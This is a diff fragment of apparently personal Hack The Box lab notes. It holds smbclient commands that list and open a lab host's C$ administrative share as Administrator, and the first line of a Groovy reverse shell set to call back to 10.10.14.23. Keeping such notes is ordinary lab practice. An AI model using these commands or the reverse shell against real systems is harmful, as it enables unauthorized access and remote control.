@@ -7,7 +7,7 @@ SSTI,XSS,blob:https://app.hackthebox.com/32caa1fd-54a8-499f-acea-b27d3e03c561
 
 SMBCLIENT
 smbclient -L 10.129.209.18 -U Administrator
-
+smbclient \\\\10.129.209.18\C$ -U Administrator
 
 Groovy rs
 String host="10.10.14.23";
